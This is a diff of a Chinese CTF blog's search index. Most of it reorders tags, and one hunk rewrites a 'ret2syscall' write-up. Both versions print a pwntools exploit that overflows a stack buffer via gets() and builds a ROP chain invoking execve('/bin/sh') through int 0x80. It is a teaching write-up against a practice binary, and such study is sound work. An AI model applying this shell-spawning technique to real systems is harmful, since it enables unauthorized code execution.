@@ -29,19 +29,6 @@
     
     
     <entry>
-      <title></title>
-      <link href="/2022/01/16/welpwn/"/>
-      <url>/2022/01/16/welpwn/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>warmup</title>
       <link href="/2022/01/15/fuzz/"/>
       <url>/2022/01/15/fuzz/</url>
@@ -58,9 +45,9 @@
       
         <tags>
             
-            <tag> 栈溢出 </tag>
-            
             <tag> xctf </tag>
+            
+            <tag> 栈溢出 </tag>
             
             <tag> fuzz </tag>
             
@@ -87,9 +74,9 @@
       
         <tags>
             
-            <tag> 栈溢出 </tag>
-            
             <tag> xctf </tag>
+            
+            <tag> 栈溢出 </tag>
             
             <tag> 数组越界 </tag>
             
@@ -143,9 +130,9 @@
       
         <tags>
             
-            <tag> 栈溢出 </tag>
-            
             <tag> xctf </tag>
+            
+            <tag> 栈溢出 </tag>
             
         </tags>
       
@@ -220,9 +207,9 @@
       
         <tags>
             
-            <tag> 栈溢出 </tag>
-            
             <tag> xctf </tag>
+            
+            <tag> 栈溢出 </tag>
             
         </tags>
       
@@ -247,9 +234,9 @@
       
         <tags>
             
-            <tag> xctf </tag>
-            
             <tag> 简单随机数绕过 </tag>
+            
+            <tag> xctf </tag>
             
         </tags>
       
@@ -362,7 +349,7 @@
       <link href="/2022/01/11/ret2syscall/"/>
       <url>/2022/01/11/ret2syscall/</url>
       
-        <content type="html"><![CDATA[<ul><li><p>首先checksec一下</p><img src="/2022/01/11/ret2syscall/ret2syscall.png" alt="image-20220111142017568" style="zoom:80%;"></li><li><p>运行程序</p><img src="/2022/01/11/ret2syscall/run.png" alt="image-20220111142216384" style="zoom:80%;"></li><li><p>拖入IDA</p><img src="/2022/01/11/ret2syscall/unsafe.png" alt="image-20220111143431233" style="zoom:80%;"><p> 发现危险函数gets(),明显的栈溢出.</p><p>​        找gadgets,使用ROPgadget进行寻找</p><p>​        eax</p><img src="/2022/01/11/ret2syscall/eax.png" alt="image-20220111144133374" style="zoom:80%;"></li></ul><p>​              ebx</p><p>​                                       <img src="/2022/01/11/ret2syscall/ebx.png" alt="image-20220111144234974" style="zoom:80%;"></p><p>​                bin/sh地址</p><p>​                                    <img src="/2022/01/11/ret2syscall/bin_sh.png" alt="image-20220111144933401" style="zoom:80%;"></p><p>​            int 0x80地址</p><p>​                                   <img src="/2022/01/11/ret2syscall/int.png" alt="image-20220111145124389" style="zoom:80%;"></p><p>​              </p><p>​          </p><ul><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                                       log_level = 'debug'elf = ELF("./ret2syscall")local = 1if local:    r = process("./ret2syscall")else:    r = remote("") eax_addr = 0x080bb196ebx_addr = 0x0806eb90int_addr = 0x08049421bin_sh = 0x080be408payload = flat(['A'*112,eax_addr,0xb,ebx_addr,0,0,bin_sh,int_addr])r.sendline(payload)r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
+        <content type="html"><![CDATA[<ul><li><h3 id="原理-控制程序执行系统调用-获取shell"><a href="#原理-控制程序执行系统调用-获取shell" class="headerlink" title="原理:控制程序执行系统调用,获取shell"></a>原理:控制程序执行系统调用,获取shell</h3></li><li><h4 id="首先checksec一下"><a href="#首先checksec一下" class="headerlink" title="首先checksec一下"></a>首先checksec一下</h4><img src="/2022/01/11/ret2syscall/ret2syscall.png" alt="image-20220111142017568" style="zoom:80%;"></li><li><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/11/ret2syscall/run.png" alt="image-20220111142216384" style="zoom:80%;"></li><li><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><img src="/2022/01/11/ret2syscall/unsafe.png" alt="image-20220111143431233" style="zoom:80%;"><p>   发现危险函数gets(),明显的栈溢出.</p><p>   找gadgets,使用ROPgadget进行寻找</p><p>​        eax</p><img src="/2022/01/11/ret2syscall/eax.png" alt="image-20220111144133374" style="zoom:80%;"></li></ul><p>​              ebx</p><p>​                                       <img src="/2022/01/11/ret2syscall/ebx.png" alt="image-20220111144234974" style="zoom:80%;"></p><ul><li> bin/sh地址</li></ul><p>​                                    <img src="/2022/01/11/ret2syscall/bin_sh.png" alt="image-20220111144933401" style="zoom:80%;"></p><ul><li> int 0x80地址                <img src="/2022/01/11/ret2syscall/int.png" alt="image-20220111145124389" style="zoom:80%;"></li></ul><p>​           </p><ul><li><p>若使用execve来获取shell</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">execve("/bin/sh",NULL,NULL)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该程序是32位,需要</p><blockquote><ul><li>系统调用号,即eax为0xb</li><li>第一个参数,即ebx应该指向/bin/sh的地址,其实执行sh的地址也可以</li><li>第二个参数ecx应该为0</li></ul></blockquote></li><li></li><li><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                                       log_level = 'debug'elf = ELF("./ret2syscall")local = 1if local:    r = process("./ret2syscall")else:    r = remote("") eax_addr = 0x080bb196ebx_addr = 0x0806eb90int_addr = 0x08049421bin_sh = 0x080be408payload = flat(['A'*112,eax_addr,0xb,ebx_addr,0,0,bin_sh,int_addr])r.sendline(payload)r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
       
       
       <categories>
